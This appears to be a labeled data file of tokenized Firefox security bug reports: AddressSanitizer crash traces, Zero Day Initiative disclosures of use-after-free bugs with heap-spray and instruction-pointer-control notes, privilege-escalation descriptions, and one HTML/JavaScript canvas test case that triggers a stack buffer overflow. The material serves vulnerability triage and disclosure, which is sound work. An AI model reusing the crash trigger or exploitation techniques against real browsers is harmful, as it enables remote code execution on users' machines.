src/content/xml/document/src/nsxmlcontentsink.cpp:951 8 in non-virtual thunk to nsxmlcontentsink handlestartelement unsigned short const unsigned short const unsigned int int unsigned int src/content/xml/document/src/nsxmlcontentsink.cpp:953 shadow byte and word fb 00 fb fb fb fb fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 stats 253m malloced 239m for red zones by 412251 calls stats 46m realloced by 24186 calls stats 224m freed by 284857 calls stats 189m really freed by 232799 calls stats 230m 59085 full pages mmaped in 438 calls mmaps by size class 7:147420 8:45034 9:13299 10:5110 11:6120 12:1280 13:960 14:544 15:224 16:712 17:456 18:36 19:35 20:21 mallocs by size class 7:267252 8:86611 9:23441 10:8604 11:16914 12:2459 13:1943 14:1595 15:413 16:1542 17:1345 18:70 19:40 20:22 frees by size class 7:182188 8:57665 9:17102 10:5439 11:14824 12:1611 13:1505 14:1424 15:281 16:1375 17:1329 18:57 19:38 20:19 rfrees by size class 7:155466 8:44862 9:10771 10:3830 11:11718 12:1214 13:1011 14:1303 15:216 16:1017 17:1295 18:50 19:37 20:9 stats malloc large 3432 small slow 5044 17302 aborting	11
heap-use-after-free in nsoverflowcontinuationtracker finish with moz-columns reproduces on trunk 3869 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsframelist firstchild const src/layout/base generic/nsframelist.h:214 1 in nsoverflowcontinuationtracker finish nsiframe src/layout/generic/nscontainerframe.cpp:1719 2 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate src/layout/generic/nsblockreflowcontext.cpp:306 3 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3097 4 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2476 5 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:2284 6 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1041 7 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 8 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:649 9 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscolumnsetframe.cpp:1032 10 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate src/layout/generic/nsblockreflowcontext.cpp:268 11 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3097 12 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2476 13 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:1996 14 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1041 15 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 16 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:649 17 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscolumnsetframe.cpp:1032 18 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate src/layout/generic/nsblockreflowcontext.cpp:268 19 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3097 20 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2476 21 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:1996 22 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1041 23 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 24 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:649 25 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscolumnsetframe.cpp:1032 26 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 27 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscanvasframe.cpp:473 28 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 29 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool src/layout/generic/nsgfxscrollframe.cpp:433 30 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const src/layout/generic/nsgfxscrollframe.cpp:533 31 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsgfxscrollframe.cpp:774 32 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 33 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsviewportframe.cpp:202 34 in presshell doreflow nsiframe bool src/layout/base/nspresshell.cpp:7502 35 in presshell processreflowcommands bool src/layout/base/nspresshell.cpp:7643 36 in presshell flushpendingnotifications mozflushtype src/layout/base/nspresshell.cpp:3883 37 in nsrefreshdriver notify nsitimer src/layout/base/nsrefreshdriver.cpp:403 38 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:485 39 in nstimerevent run src/xpcom/threads/nstimerimpl.cpp:565 40 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 41 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:221 42 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 43 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:215 44 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:208 45 in messageloop run src/ipc/chromium/src/base/message_loop.cc:182 46 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 47 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:290 48 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3823 49 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3890 50 in xre_main src/toolkit/xre/nsapprunner.cpp:4084 51 in do_main int char src/browser/app/nsbrowserapp.cpp:174 52 in main src/browser/app/nsbrowserapp.cpp:279 53 in 0 is located 0 bytes inside of 16-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free src/memory/mozalloc/mozalloc.cpp:48 2 in operator delete void src dist/include/mozilla/mozalloc.h:224 3 in nscontainerframe stealframe nsprescontext nsiframe bool src/layout/generic/nscontainerframe.cpp:1212 4 in nsblockframe stealframe nsprescontext nsiframe bool src/layout/generic/nsblockframe.cpp:5538 5 in nscontainerframe deletenextinflowchild nsprescontext nsiframe bool src/layout/generic/nscontainerframe.cpp:1359 6 in nsblockframe deletenextinflowchild nsprescontext nsiframe bool src/layout/generic/nsblockframe.cpp:5625 7 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate src/layout/generic/nsblockreflowcontext.cpp:307 8 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3097 9 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2476 10 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:1996 11 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1041 12 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 13 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:649 14 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscolumnsetframe.cpp:1032 previously allocated by thread t0 here 0 in malloc 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3266 4 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2476 5 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:2284 6 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1041 7 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:952 8 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:649 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 fb fb fb fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd stats 252m malloced 231m for red zones by 340183 calls stats 46m realloced by 17894 calls stats 221m freed by 224349 calls stats 186m really freed by 177540 calls stats 235m 60247 full pages mmaped in 447 calls mmaps by size class 7:102375 8:45034 9:13299 10:5110 11:8670 12:1280 13:960 14:544 15:224 16:784 17:460 18:36 19:35 20:21 mallocs by size class 7:196151 8:83366 9:22929 10:9146 11:19278 12:2496 13:1908 14:1548 15:413 16:1467 17:1349 18:70 19:40 20:22 frees by size class 7:122554 8:54394 9:16555 10:5987 11:17304 12:1710 13:1495 14:1365 15:281 16:1256 17:1334 18:57 19:38 20:19 rfrees by size class 7:99289 8:43459 9:10392 10:4360 11:13903 12:1343 13:996 14:1255 15:215 16:939 17:1297 18:49 19:37 20:6 stats malloc large 3361 small slow 4876 3869 aborting	11
chrome object wrapper can be bypassed using object.prototype.__proto it is possible to change the prototype of an object wrapped in a cross-compartment wrapper if the setter of object.prototype.__proto is called in the context of the wrapper this can be used against chrome objects that do n't explicitly define exposedprops to gain access to privileged methods this bug appears to have been introduced in firefox 17 the earlier versions do n't have accessors on proto	2
content can access chrome-privileged pages using plugin objects it is possible to open chrome-privileged pages via plugin instances cloned into anonymous content of the svg use element the root of the problem lies in the method nsplugininstanceowner geturl which may resolve a relative path against a chrome uri and pass it to the onlinkclick handler method in theory such uri should be rejected earlier in nspluginhost geturlwithheaders where dourlloadsecuritycheck is called but there s a discrepancy between how nspluginhost dourlloadsecuritycheck and nsicontent getbaseuri derive the baseuri this inconsistency allows a malicious website to load an arbitrary chrome page in a frame and use it to escalate privileges in drive-by download attacks	9
fix xmlserializer use-after-free remote code execution vulnerability zdi-can-1608 gpgmail-start-pgp-part zdi-can-1608 mozilla firefox xmlserializer use-after-free remote code execution vulnerability cvss 7.5 av n/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details version s tested mozilla firefox 13.0.1 platform s tested windows xp sp3 vulnerability details from the researcher from content/base/src/nsdomserializer.cpp nsdocumentencoder serializetostringrecursive nsinode anode nsastring astr bool adontserializeroot if adontserializeroot rv serializenodestart maybefixednode 0 1 astr anode ns_ensure_success rv rv nsdocumentencoder serializenodestart nsinode anode print32 astartoffset print32 aendoffset nsastring astr nsinode aoriginalnode if node iselement element originalelement aoriginalnode aoriginalnode iselement aoriginalnode aselement nsnull mserializer appendelementstart node aselement originalelement astr return ns_ok from content/base/src/nsxmlcontentserializer.cpp nsxmlcontentserializer appendelementstart element aelement element aoriginalelement nsastring astr if checkelementstart content forceformat astr return ns_ok from content/base/src/nsxhtmlcontentserializer.cpp nsxhtmlcontentserializer checkelementstart nsicontent acontent bool aforceformat nsastring astr aforceformat acontent hasattr knamespaceid_none nsgkatoms mozdirty after reaching the use-after-free condition we need to take over memory previously occupied by a deleted node thus we force allocation of some strings that will make child getnextsibling return memory address within predictable range of a heap spray if data stored on a heap spray fulfils basic constraints at offset of mboolflags for the sake of node iselement being true we are free to specify custom pointer to virtual function table this way we can arbitrarily change program execution flow at acontent hasattr the code below triggers the vulnerability begin code snip doctype html mozilla firefox 13.0.1 xmlserializer use-after-free windows xp sp3 x86 eip control regenrecht o2.pl jul 2012 html body onload run body html end code snip this will create an xmlserializer and an associated write function that will remove a node and spray the heap such that eip will end up being c1c2c3c4 credit this vulnerability was discovered by regenrecht further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 180 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures tippingpoint.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used tippingpoint does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor tippingpoint provides its customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available furthermore with the altruistic aim of helping to secure a broader user base tippingpoint provides this vulnerability information confidentially to security vendors including competitors who have a vulnerability protection or mitigation product please contact us for further information or refer to disclosure policy our vulnerability disclosure policy is available online at	11
listenermanager use-after-free remote code execution vulnerability zdi-can-1591 cvss 7.5 av n/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details version s tested mozilla firefox 12.0 platform s tested windows xp sp3 vulnerability details the vulnerable function is listenermanager dispatchevent within dom/workers/listenermanager.cpp from the researcher registered event listeners are stored in temporary js vector before being called one by one when the number of jsval|s held in listeners exceeds 10 storage space for them is allocated on the heap thus they are unreachable from garbage collector roots during user-provided event handling callback one is free to remove/unregister all the listeners and force garbage collection jsval|s kept in listeners will become dangling pointers the code below triggers the vulnerability begin code snip doctype html mozilla firefox 12.0 listenermanager dangling pointer windows xp sp3 x86 code exec regenrecht o2.pl may 2012 html head head body onload run body html end code snip this code will create a listener that will erase all subsequent listeners and replace them with memory that ll result in eip being c1c2c3c4 credit this vulnerability was discovered by regenrecht further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 180 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures tippingpoint.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used tippingpoint does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor tippingpoint provides its customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available furthermore with the altruistic aim of helping to secure a broader user base tippingpoint provides this vulnerability information confidentially to security vendors including competitors who have a vulnerability protection or mitigation product please contact us for further information or refer to disclosure policy our vulnerability disclosure policy is available online at	11
fix mozvibrate use-after-free remote code execution vulnerability zdi-can-1589 cvss 7.5 av n/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details version s tested mozilla firefox 13.0 platform s tested windows xp sp3 vulnerability details the vulnerable function is navigator mozvibrate within dom/base/navigator.cpp from the researcher note that domdoc is a weak pointer as the logic of js_getarraylength is under attacker s control it is possible to force removal of object currently pointed by domdoc this will lead to domdoc becoming a dangling pointer after the js_getarraylength call such stale pointer is then passed to vibratewindowlistener constructor the code below triggers the vulnerability begin code snip doctype html mozilla firefox 13.0 mozvibrate dangling pointer windows xp sp3 x86 code exec regenrecht o2.pl jun 2012 html head head body onload run body html end code snip this poc will trigger the vulnerability and result in eip being set to c1c2c1c2 credit this vulnerability was discovered by regenrecht further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 180 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures tippingpoint.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used tippingpoint does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor tippingpoint provides its customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available furthermore with the altruistic aim of helping to secure a broader user base tippingpoint provides this vulnerability information confidentially to security vendors including competitors who have a vulnerability protection or mitigation product please contact us for further information or refer to disclosure policy our vulnerability disclosure policy is available online at	11
obj_tosource use-after-free remote code execution vulnerability zdi-can-1571 cvss 7.5 av n/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox vulnerability details tested on 16.0.2 from js/src/jsobj.cpp obj_tosource jscontext cx uintn argc value vp jsobject obj toobject cx vp1 if obj return false jshashentry he js_entersharpobject cx obj amp ida amp chars if he return false js_entersharpobject jscontext cx jsobject obj jsidarray idap jschar sp sp null map cx sharpobjectmap ida null if map depth 0 map depth he marksharpobjects cx obj amp ida map depth else marksharpobjects jscontext cx jsobject obj jsidarray idap map cx sharpobjectmap js_assert map depth 1 table map table hash js_hash_object obj hep js_hashtablerawlookup table hash obj he hep if he ida js_enumerate cx obj if ida return null ok js_true for i 0 length ida length i length i id ida vector i ok obj lookupgeneric cx id amp obj2 amp prop else note that jsid|s stored at ida are unrooted during execution of obj_tosource and its sub-functions this means that after successful call to js_enumerate one can drop previously returned jsid|s from the parent object and force their removal due to garbage collection it can be done during call to obj lookupgeneric such action will lead to a dangling pointer vulnerability at the following for iteration ida vector i will contain pointer to already freed object exploit 1 create javascript proxy object with the following characteristics a handler method get returns dummy data just to fulfill the contract with the iterator b handler method has always returns true to prolong process of iterating over properties it also sprays the heap and forces garbage collection c handler method keys returns bogus unrooted list of properties instances of e4x qname class are used for the sake of reliability 2 call javascript object s tosource method this leads to a dangling pointer condition credit this vulnerability was discovered by regenrecht further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 180 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures tippingpoint.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used tippingpoint does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor tippingpoint provides its customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available furthermore with the altruistic aim of helping to secure a broader user base tippingpoint provides this vulnerability information confidentially to security vendors including competitors who have a vulnerability protection or mitigation product please contact us for further information or refer to disclosure policy our vulnerability disclosure policy is available online at	11
heap-use-after-free in tablebackgroundpainter tablebackgrounddata destroy tested on os ubuntu 12.04 x86_64 firefox build choller/firefox/asan/20121123-mozilla-central-linux64-debug-d8e4f06198dc+asan.html asan-report snippet assertion colgroup data should not be null bug 237421 mcols i mcolgroup file builds/slave/try-lnx64-dbg/build/layout/tables/nstablepainter.cpp line 314 assertion colgroup data should not be null bug 237421 mcols i mcolgroup file builds/slave/try-lnx64-dbg/build/layout/tables/nstablepainter.cpp line 314 5093 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in tablebackgroundpainter tablebackgrounddata destroy nsprescontext builds/slave/try-lnx64-dbg/build/layout/tables/nstablepainter.cpp:123 1 in tablebackgroundpainter builds/slave/try-lnx64-dbg/build/layout/tables/nstablepainter.cpp:239 2 in nstableframe painttableborderbackground nsrenderingcontext nsrect const nspoint unsigned int builds/slave/try-lnx64-dbg/build/layout/tables/nstableframe.cpp:1310 3 in nsdisplaytableborderbackground paint nsdisplaylistbuilder nsrenderingcontext builds/slave/try-lnx64-dbg/build/layout/tables/nstableframe.cpp:1086 4 in mozilla framelayerbuilder drawthebeslayer mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void builds/slave/try-lnx64-dbg/build/layout/base/framelayerbuilder.cpp:3274 5 in mozilla layers basicthebeslayer paintbuffer gfxcontext nsintregion const nsintregion const nsintregion const bool void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void builds/slave/try-lnx64-dbg/build/gfx/layers/basic/basicthebeslayer.h:94 freed by thread t0 here 0 in operator delete void 0 1 in tablebackgroundpainter builds/slave/try-lnx64-dbg/build/layout/tables/nstablepainter.cpp:240 2 in nstableframe painttableborderbackground nsrenderingcontext nsrect const nspoint unsigned int builds/slave/try-lnx64-dbg/build/layout/tables/nstableframe.cpp:1310 3 in nsdisplaytableborderbackground paint nsdisplaylistbuilder nsrenderingcontext builds/slave/try-lnx64-dbg/build/layout/tables/nstableframe.cpp:1086 4 in mozilla framelayerbuilder drawthebeslayer mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void builds/slave/try-lnx64-dbg/build/layout/base/framelayerbuilder.cpp:3274 5 in mozilla layers basicthebeslayer paintbuffer gfxcontext nsintregion const nsintregion const nsintregion const bool void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void builds/slave/try-lnx64-dbg/build/gfx/layers/basic/basicthebeslayer.h:94	11
stack buffer overflow with canvas html head script settimeout location.reload 1000 el18=document.createelement canvas ctx=el18.getcontext 2d ctx.shadowcolor black ctx.shadowblur 8 ctx.globalalpha=0 ctx.miterlimit=0 ctx.strokestyle=ctx.createlineargradient 0 0 0 0 ctx.beginpath ctx.arc 50 80 125 0.1 1 false ctx.scale 0.0055 1 document.implementation.createdocument null adoptnode el18 var imgxz new image imgxz.src data image/png base64 ivborw0kggoaaaansuheugaaaauaaaafcayaaacnbyblaaaaheleqvqi12p4//8/w38giaxdibke0dhxgljnbaao9txl0y4ohwaaaabjru5erkjggg ctx.fillstyle=ctx.createpattern imgxz ctx.fill 0 0 script head body body html results in 3262 error addresssanitizer stack-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in fast_composite_scaled_bilinear_sse2_8888_8_8888_normal_over builds/slave/try-lnx64/build/gfx/cairo/libpixman/src/pixman-sse2.c:5725 1 in moz_pixman_image_composite32 builds/slave/try-lnx64/build/gfx/cairo/libpixman/src/pixman.c:712 2 in composite_spans builds/slave/try-lnx64/build/gfx/cairo/cairo/src/cairo-image-surface.c:3496 address is located at offset 220 in frame fast_composite_scaled_bilinear_sse2_8888_8_8888_normal_over of t0 s stack this frame has 5 object s 32 44 v 96 104 buf1 160 168 buf2 224 736 extended_src_line0 768 1280 extended_src_line1	11
quickstubs returning jsval should js_wrapvalue i ran into this in bug 812744 but did n't realize until later that this was also a problem patch coming up example codegen before the patch nsresult rv rv self getonmouseenter cx vp if ns_failed rv return xpc_qsthrowgettersetterfailed cx rv jsval_to_object vp id return js_true and after nsresult rv jsval result rv self getonmouseenter cx result if ns_failed rv return xpc_qsthrowgettersetterfailed cx rv jsval_to_object vp id vp result return js_wrapvalue cx vp note that before the patch we had two problems 1 if the native method threw we passed an already-clobbered thing to the third argument of xpc_qsthrowgettersetterfailed in fact what we passed might not be an object at all and might not be in the compartment of cx even if it is and so forth 2 we never ensured that the return value is in the compartment of cx the patch fixes both issues	11
out of bounds read in selectioniterator getnextsegment 31621 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in gfxshapedword compressedglyph isclusterstart const src/gfx/thebes/gfxfont.h:1920 1 in gfxtextrun isclusterstart unsigned int src/gfx/thebes/gfxfont.h:2383 2 in selectioniterator getnextsegment double unsigned int unsigned int double short nstextrangestyle src/layout/generic/nstextframethebes.cpp:5287 3 in nstextframe painttextselectiondecorations gfxcontext gfxpoint const gfxpoint const gfxrect const propertyprovider unsigned int unsigned int nstextpaintstyle selectiondetails short nstextframe drawpathcallbacks src/layout/generic/nstextframethebes.cpp:5581 4 in nstextframe painttextwithselection gfxcontext gfxpoint const gfxpoint const gfxrect const propertyprovider unsigned int unsigned int nstextpaintstyle nscharclipdisplayitem clipedges const nstextframe drawpathcallbacks src/layout/generic/nstextframethebes.cpp:5636 5 in nstextframe painttext nsrenderingcontext nspoint nsrect const nscharclipdisplayitem const nstextframe drawpathcallbacks src/layout/generic/nstextframethebes.cpp:5860 6 in nsdisplaytext paint nsdisplaylistbuilder nsrenderingcontext src/layout/generic/nstextframethebes.cpp:4572 7 in mozilla framelayerbuilder drawthebeslayer mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void src/layout/base/framelayerbuilder.cpp:3282 8 in mozilla layers basicthebeslayer paintbuffer gfxcontext nsintregion const nsintregion const nsintregion const bool void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void src/gfx/layers/basic/basicthebeslayer.h:94 9 in mozilla layers basicshadowablethebeslayer paintbuffer gfxcontext nsintregion const nsintregion const nsintregion const bool void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void src/gfx/layers/basic/basicthebeslayer.cpp:402 10 in mozilla layers basicthebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basicthebeslayer.cpp:189 11 in mozilla layers basicshadowablethebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basicthebeslayer.cpp:303 12 in non-virtual thunk to mozilla layers basicshadowablethebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basicthebeslayer.cpp:314 13 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext src/gfx/layers/basic/basiclayermanager.cpp:827 14 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basiclayermanager.cpp:942 15 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext src/gfx/layers/basic/basiclayermanager.cpp:843 16 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basiclayermanager.cpp:942 17 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext src/gfx/layers/basic/basiclayermanager.cpp:843 18 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers 